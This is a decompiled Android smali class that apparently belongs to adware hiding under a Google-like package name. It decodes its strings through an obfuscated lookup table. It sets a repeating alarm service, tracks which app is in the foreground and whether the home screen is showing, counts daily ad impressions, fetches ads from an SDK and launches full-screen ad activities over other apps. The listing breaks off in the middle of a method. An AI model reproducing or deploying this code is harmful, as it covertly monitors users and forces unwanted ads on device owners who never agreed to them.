.class public Lcom/attached/TengxunSb;
.super Ljava/lang/Object;
.source "TengxunSb.java"

# interfaces
.implements Lcom/sgoogle/LuFei;


# static fields
.field public static RETRY:I = 0x0

.field public static TEST:I = 0x0

.field public static final TYPE:Ljava/lang/String;

.field public static final auto:I = 0xa

.field public static l:[Ljava/lang/String; = null

.field public static final sb_OPEN:Ljava/lang/String;

.field public static final sb_baidu:Ljava/lang/String;

.field public static final sbbaidua:I = 0x6e


# instance fields
.field public context:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const/4 v1, 0x3

    .line 30
    const/16 v0, 0x44

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    .line 95
    new-array v0, v1, [I

    fill-array-data v0, :array_0

    invoke-static {v0}, Lcom/attached/TengxunSb;->m([I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/attached/TengxunSb;->sb_baidu:Ljava/lang/String;

    .line 96
    new-array v0, v1, [I

    fill-array-data v0, :array_1

    invoke-static {v0}, Lcom/attached/TengxunSb;->m([I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/attached/TengxunSb;->sb_OPEN:Ljava/lang/String;

    .line 99
    new-array v0, v1, [I

    fill-array-data v0, :array_2

    invoke-static {v0}, Lcom/attached/TengxunSb;->m([I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/attached/TengxunSb;->TYPE:Ljava/lang/String;

    .line 130
    const/4 v0, 0x5

    sput v0, Lcom/attached/TengxunSb;->RETRY:I

    .line 131
    const/4 v0, 0x0

    sput v0, Lcom/attached/TengxunSb;->TEST:I

    return-void

    .line 95
    nop

    :array_0
    .array-data 4
        0x32
        0x32
        0x32
    .end array-data

    .line 96
    :array_1
    .array-data 4
        0x28
        0x28
        0x28
    .end array-data

    .line 99
    :array_2
    .array-data 4
        0x1e
        0x1e
        0x0
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static adv(Landroid/content/Context;)V
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 75
    sget-object v1, Lcom/sgoogle/BaiduSb;->sb:Lcom/sgoogle/BaiduSb;

    if-eqz v1, :cond_0

    .line 76
    sget-object v1, Lcom/sgoogle/BaiduSb;->sb:Lcom/sgoogle/BaiduSb;

    iget-object v1, v1, Lcom/sgoogle/BaiduSb;->click:Landroid/view/View$OnClickListener;

    if-eqz v1, :cond_0

    .line 77
    sget-object v1, Lcom/sgoogle/BaiduSb;->sb:Lcom/sgoogle/BaiduSb;

    iget-object v1, v1, Lcom/sgoogle/BaiduSb;->click:Landroid/view/View$OnClickListener;

    const/4 v2, 0x0

    invoke-interface {v1, v2}, Landroid/view/View$OnClickListener;->onClick(Landroid/view/View;)V

    .line 80
    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/attached/Tmac;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 82
    .local v0, "in":Landroid/content/Intent;
    new-instance v0, Landroid/content/Intent;

    .end local v0    # "in":Landroid/content/Intent;
    const-class v1, Lcom/attached/Qihus;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 84
    .restart local v0    # "in":Landroid/content/Intent;
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_1

    .line 85
    const-string v1, "JULY"

    const-string v2, "openAdv===================================="

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 86
    const-string v1, "JULY"

    const-string v2, "=======OPEN======="

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 87
    const-string v1, "JULY"

    const-string v2, "openAdv===================================="

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 89
    :cond_1
    const/high16 v1, 0x4000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 90
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 91
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 92
    return-void
.end method

.method public static kobeing(Landroid/content/Context;)V
    .locals 18
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 137
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getDefPref(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 138
    .local v2, "config":Landroid/content/SharedPreferences;
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getDefPref(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v14

    .line 139
    const-string v15, "nv_uwjjd"

    const-wide/16 v16, 0x5

    .line 138
    invoke-interface/range {v14 .. v17}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v14

    .line 139
    const-wide/16 v16, 0x3e8

    .line 138
    mul-long v14, v14, v16

    .line 139
    const-wide/16 v16, 0x3c

    .line 138
    mul-long v6, v14, v16

    .line 140
    .local v6, "interval":J
    sget-boolean v14, Lcom/sgoogle/Constants;->USE_MAX:Z

    if-eqz v14, :cond_2

    .line 141
    new-instance v14, Ljava/util/Random;

    invoke-direct {v14}, Ljava/util/Random;-><init>()V

    const/4 v15, 0x6

    invoke-virtual {v14, v15}, Ljava/util/Random;->nextInt(I)I

    move-result v14

    mul-int/lit16 v14, v14, 0x3e8

    mul-int/lit8 v14, v14, 0x3c

    .line 142
    new-instance v15, Ljava/util/Random;

    invoke-direct {v15}, Ljava/util/Random;-><init>()V

    const v16, 0x186a0

    invoke-virtual/range {v15 .. v16}, Ljava/util/Random;->nextInt(I)I

    move-result v15

    .line 141
    add-int/2addr v14, v15

    int-to-long v6, v14

    .line 147
    :goto_0
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getIntervalTime(Landroid/content/Context;)J

    move-result-wide v14

    const-wide/16 v16, 0x3e8

    mul-long v14, v14, v16

    const-wide/16 v16, 0x3c

    mul-long v6, v14, v16

    .line 148
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_0

    .line 149
    const-wide/16 v6, 0x4e20

    .line 152
    :cond_0
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getShowAdvCount(Landroid/content/Context;)I

    move-result v13

    .line 153
    .local v13, "total":I
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getSuccessStatus(Landroid/content/Context;)Z

    move-result v9

    .line 154
    .local v9, "successStatus":Z
    if-nez v9, :cond_3

    .line 155
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/TongJiTools;->init(Landroid/content/Context;)V

    .line 352
    :cond_1
    :goto_1
    return-void

    .line 144
    .end local v9    # "successStatus":Z
    .end local v13    # "total":I
    :cond_2
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getIntervalTime(Landroid/content/Context;)J

    move-result-wide v14

    const-wide/16 v16, 0x3e8

    mul-long v14, v14, v16

    const-wide/16 v16, 0x3c

    mul-long v6, v14, v16

    goto :goto_0

    .line 162
    .restart local v9    # "successStatus":Z
    .restart local v13    # "total":I
    :cond_3
    const-string v14, "yw_hdjhg"

    const-wide/16 v16, 0x0

    move-wide/from16 v0, v16

    invoke-interface {v2, v14, v0, v1}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v4

    .line 163
    .local v4, "insert":J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    sub-long v10, v14, v4

    .line 164
    .local v10, "runtime":J
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_4

    .line 165
    const-string v14, "JULY"

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "-----\u65f6\u95f4\u5dee------"

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v15, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 166
    const-string v14, "JULY"

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "-----\u95f4\u9694\u65f6\u95f4------"

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v15, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 168
    :cond_4
    const-string v14, "runpn"

    const-string v15, ""

    invoke-interface {v2, v14, v15}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 169
    .local v8, "runpn":Ljava/lang/String;
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getMaxShowCount(Landroid/content/Context;)I

    move-result v3

    .line 170
    .local v3, "maxCount":I
    const/4 v14, -0x1

    if-ne v3, v14, :cond_5

    sget v14, Lcom/attached/TengxunSb;->RETRY:I

    if-eqz v14, :cond_5

    .line 171
    sget v14, Lcom/attached/TengxunSb;->RETRY:I

    add-int/lit8 v14, v14, -0x1

    sput v14, Lcom/attached/TengxunSb;->RETRY:I

    .line 172
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_1

    .line 173
    const-string v14, "JULY"

    const-string v15, "-----\u7b49\u7f51\u7edc.............------"

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 177
    :cond_5
    const-wide/16 v14, 0x0

    cmp-long v14, v4, v14

    if-eqz v14, :cond_6

    cmp-long v14, v10, v6

    if-lez v14, :cond_1

    .line 178
    :cond_6
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_7

    .line 179
    const-string v15, "JULY"

    .line 180
    new-instance v16, Ljava/lang/StringBuilder;

    const-string v14, "isAppRunning=="

    move-object/from16 v0, v16

    invoke-direct {v0, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 181
    invoke-static/range {p0 .. p0}, Lcom/attached/PackageMangerTool;->isLauncherRunnig(Landroid/content/Context;)Z

    move-result v14

    if-eqz v14, :cond_d

    const/4 v14, 0x0

    :goto_2
    move-object/from16 v0, v16

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v14

    .line 180
    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    .line 179
    invoke-static {v15, v14}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 183
    :cond_7
    invoke-static/range {p0 .. p0}, Lcom/attached/PackageMangerTool;->isLauncherRunnig(Landroid/content/Context;)Z

    move-result v14

    if-nez v14, :cond_1

    .line 185
    invoke-static/range {p0 .. p0}, Lcom/attached/PackageMangerTool;->getTopActivityPackageName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    .line 186
    .local v12, "topActivity":Ljava/lang/String;
    sget v14, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v15, 0x13

    if-le v14, v15, :cond_8

    .line 187
    const-string v12, "ss"

    .line 188
    :cond_8
    const-string v14, ""

    invoke-virtual {v8, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-nez v14, :cond_9

    invoke-virtual {v8, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-eqz v14, :cond_9

    .line 189
    const-string v14, "test"

    invoke-virtual {v8, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 196
    :cond_9
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_a

    .line 197
    const-string v14, "JULY"

    .line 198
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "....SYSTEMAPP......."

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 200
    invoke-static/range {p0 .. p0}, Lcom/attached/PackageMangerTool;->isSystemAppRuning(Landroid/content/Context;)Z

    move-result v16

    .line 199
    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v15

    .line 198
    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    .line 197
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 208
    :cond_a
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-eqz v14, :cond_b

    .line 209
    const-string v14, "JULY"

    const-string v15, "------is self--------"

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 210
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_b

    .line 211
    const-string v14, "JULY"

    const-string v15, "------is self--RETURN------"

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 216
    :cond_b
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v14

    .line 217
    const-string v15, "yw_hdjhg"

    .line 218
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v16

    .line 217
    invoke-interface/range {v14 .. v17}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v14

    .line 218
    invoke-interface {v14}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 219
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v14

    .line 221
    const-string v15, "runpn"

    .line 223
    invoke-static/range {p0 .. p0}, Lcom/attached/PackageMangerTool;->getTopActivityPackageName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v16

    .line 220
    invoke-interface/range {v14 .. v16}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v14

    .line 224
    invoke-interface {v14}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 225
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getCurrentWeek(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v14

    invoke-static {}, Lcom/sgoogle/Tools;->getWeek()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-nez v14, :cond_e

    .line 226
    invoke-static {}, Lcom/sgoogle/Tools;->getWeek()Ljava/lang/String;

    move-result-object v14

    move-object/from16 v0, p0

    invoke-static {v0, v14}, Lcom/sgoogle/Tools;->setCurrentWeek(Landroid/content/Context;Ljava/lang/String;)V

    .line 227
    const/4 v14, 0x1

    move-object/from16 v0, p0

    invoke-static {v0, v14}, Lcom/sgoogle/Tools;->setShowAdvCount(Landroid/content/Context;I)V

    .line 229
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_c

    .line 230
    const-string v14, "JULY"

    const-string v15, "\u65b0\u7684\u4e00\u5929.............................."

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 231
    :cond_c
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getMaxShowCount(Landroid/content/Context;)I

    move-result v14

    const/4 v15, -0x1

    if-eq v14, v15, :cond_11

    .line 232
    const/4 v14, -0x1

    move-object/from16 v0, p0

    invoke-static {v0, v14}, Lcom/sgoogle/Tools;->setMaxShowCount(Landroid/content/Context;I)V

    .line 233
    const/4 v14, 0x0

    move-object/from16 v0, p0

    invoke-static {v0, v14}, Lcom/sgoogle/Tools;->setSuccess(Landroid/content/Context;Z)V

    .line 234
    invoke-static/range {p0 .. p0}, Lcom/sgoogle/TongJiTools;->init(Landroid/content/Context;)V

    goto/16 :goto_1

    .line 181
    .end local v12    # "topActivity":Ljava/lang/String;
    :cond_d
    const/4 v14, 0x1

    goto/16 :goto_2

    .line 239
    .restart local v12    # "topActivity":Ljava/lang/String;
    :cond_e
    const-string v14, "JULY"

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "\u5f00\u59cb\u53bb\u5c55\u793a\u7b2c"

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v15, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "\u6b21!!!"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    .line 240
    const-string v14, "JULY"

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "\u4e00\u5929\u6700\u5927\u5c55\u793a\u6b21\u6570=MAX_ADV_COUNT="

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 241
    sget v16, Lcom/sgoogle/Constants;->MAX_ADV_COUNT:I

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    .line 240
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    .line 242
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_f

    .line 243
    const-string v14, "JULY"

    .line 244
    const-string v15, "++++++++++++++++++++++++++++++++++++++++++++++++++"

    .line 243
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 245
    const-string v14, "JULY"

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "\u4e00\u5929\u6700\u5927\u5c55\u793a\u6b21\u6570=MAX_ADV_COUNT="

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 246
    sget v16, Lcom/sgoogle/Constants;->MAX_ADV_COUNT:I

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    .line 245
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 247
    const-string v14, "JULY"

    .line 248
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "\u4e00\u5929\u6700\u5927\u5c55\u793a\u6b21\u6570="

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static/range {p0 .. p0}, Lcom/sgoogle/Tools;->getMaxShowCount(Landroid/content/Context;)I

    move-result v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    .line 247
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 249
    const-string v14, "JULY"

    .line 250
    const-string v15, "++++++++++++++++++++++++++++++++++++++++++++++++++"

    .line 249
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 252
    :cond_f
    sget v14, Lcom/sgoogle/Constants;->MAX_ADV_COUNT:I

    if-lt v13, v14, :cond_11

    .line 253
    sget v14, Lcom/attached/TengxunSb;->TEST:I

    add-int/lit8 v14, v14, 0x1

    sput v14, Lcom/attached/TengxunSb;->TEST:I

    .line 254
    sget-boolean v14, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v14, :cond_1

    .line 255
    sget v14, Lcom/attached/TengxunSb;->TEST:I

    const/4 v15, 0x5

    if-ne v14, v15, :cond_10

    .line 256
    const-string v14, "2016-05-11 \u5468\u56db"

    move-object/from16 v0, p0

    invoke-static {v0, v14}, Lcom/sgoogle/Tools;->setCurrentWeek(Landroid/content/Context;Ljava/lang/String;)V

    .line 257
    const/4 v14, 0x0

    sput v14, Lcom/attached/TengxunSb;->TEST:I

    .line 259
    :cond_10
    const-string v14, "JULY"

    .line 260
    const-string v15, "++++++++++++++++++++++++++++++++++++++++++++++++++"

    .line 259
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 261
    const-string v14, "JULY"

    .line 262
    const-string v15, "\u4eca\u5929\u663e\u793a\u5b8c\u4e86,\u8865\u91cf\u4e5f\u5b8c\u5566............................."

    .line 261
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 263
    const-string v14, "JULY"

    .line 264
    const-string v15, "++++++++++++++++++++++++++++++++++++++++++++++++++"

    .line 263
    invoke-static {v14, v15}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    .line 277
    :cond_11
    const-string v14, "12241"

    .line 278
    new-instance v15, Lcom/attached/TengxunSb$1;

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-direct {v15, v0, v1}, Lcom/attached/TengxunSb$1;-><init>(Landroid/content/Context;Landroid/content/Context;)V

    .line 277
    move-object/from16 v0, p0

    invoke-static {v0, v14, v15}, Lcom/sgoogle/TongJiTools;->bdsdkGetAdsLogical(Landroid/content/Context;Ljava/lang/String;Lhttp/HttpRequestCallback;)V

    goto/16 :goto_1
.end method

.method public static varargs m([I)Ljava/lang/String;
    .locals 5
    .param p0, "params"    # [I

    .prologue
    .line 36
    sget-object v2, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    if-nez v2, :cond_0

    .line 37
    const/16 v2, 0x44

    new-array v2, v2, [Ljava/lang/String;

    sput-object v2, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    .line 38
    invoke-static {}, Lcom/attached/TengxunSb;->x()V

    .line 40
    :cond_0
    sget-object v2, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    array-length v2, v2

    if-lez v2, :cond_1

    .line 41
    sget-object v2, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/4 v3, 0x0

    aget-object v2, v2, v3

    if-nez v2, :cond_1

    .line 42
    invoke-static {}, Lcom/attached/TengxunSb;->x()V

    .line 46
    :cond_1
    const-string v1, ""

    .line 47
    .local v1, "result":Ljava/lang/String;
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    array-length v2, p0

    if-lt v0, v2, :cond_2

    .line 50
    return-object v1

    .line 48
    :cond_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    aget v4, p0, v0

    aget-object v3, v3, v4

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 47
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static setAdrm(Landroid/content/Context;)V
    .locals 11
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 103
    :try_start_0
    new-instance v9, Landroid/content/Intent;

    invoke-direct {v9}, Landroid/content/Intent;-><init>()V

    .line 104
    .local v9, "intent":Landroid/content/Intent;
    const-class v1, Lcom/wzz/wzz/QieSb;

    invoke-virtual {v9, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 105
    sget-object v1, Lcom/attached/TengxunSb;->sb_OPEN:Ljava/lang/String;

    invoke-virtual {v9, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 106
    const/4 v1, 0x3

    new-array v1, v1, [I

    fill-array-data v1, :array_0

    invoke-static {v1}, Lcom/attached/TengxunSb;->m([I)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v9, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 107
    sget-object v1, Lcom/attached/TengxunSb;->TYPE:Ljava/lang/String;

    const/16 v2, 0x6e

    invoke-virtual {v9, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 109
    const/16 v1, 0xb

    const/high16 v2, 0x8000000

    .line 108
    invoke-static {p0, v1, v9, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 111
    .local v6, "pendingIntent":Landroid/app/PendingIntent;
    const-string v1, "alarm"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    .line 110
    check-cast v0, Landroid/app/AlarmManager;

    .line 112
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v7

    .line 113
    .local v7, "calendar":Ljava/util/Calendar;
    const/16 v10, 0x1770

    .line 114
    .local v10, "time":I
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_0

    .line 115
    const-string v1, "JULY"

    const-string v2, "-------------------\u65f6\u949f\u542f\u52a8.---------------------"

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 116
    const/16 v10, 0x1770

    .line 121
    :goto_0
    const/4 v1, 0x0

    .line 122
    invoke-virtual {v7}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v2

    int-to-long v4, v10

    add-long/2addr v2, v4

    int-to-long v4, v10

    .line 121
    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 128
    .end local v0    # "alarmManager":Landroid/app/AlarmManager;
    .end local v6    # "pendingIntent":Landroid/app/PendingIntent;
    .end local v7    # "calendar":Ljava/util/Calendar;
    .end local v9    # "intent":Landroid/content/Intent;
    .end local v10    # "time":I
    :goto_1
    return-void

    .line 118
    .restart local v0    # "alarmManager":Landroid/app/AlarmManager;
    .restart local v6    # "pendingIntent":Landroid/app/PendingIntent;
    .restart local v7    # "calendar":Ljava/util/Calendar;
    .restart local v9    # "intent":Landroid/content/Intent;
    .restart local v10    # "time":I
    :cond_0
    const/16 v10, 0x2710

    goto :goto_0

    .line 123
    .end local v0    # "alarmManager":Landroid/app/AlarmManager;
    .end local v6    # "pendingIntent":Landroid/app/PendingIntent;
    .end local v7    # "calendar":Ljava/util/Calendar;
    .end local v9    # "intent":Landroid/content/Intent;
    .end local v10    # "time":I
    :catch_0
    move-exception v8

    .line 124
    .local v8, "e":Ljava/lang/Exception;
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_1

    .line 125
    const-string v1, "JULY"

    const-string v2, "--------------------ERROR---------------------"

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 126
    :cond_1
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 106
    :array_0
    .array-data 4
        0x24
        0x1e
        0x32
    .end array-data
.end method

.method public static x()V
    .locals 5

    .prologue
    const/16 v4, 0x1a

    .line 55
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    if-lt v0, v4, :cond_0

    .line 59
    const/4 v0, 0x0

    :goto_1
    if-lt v0, v4, :cond_1

    .line 63
    const/4 v0, 0x0

    :goto_2
    const/16 v1, 0xa

    if-lt v0, v1, :cond_2

    .line 66
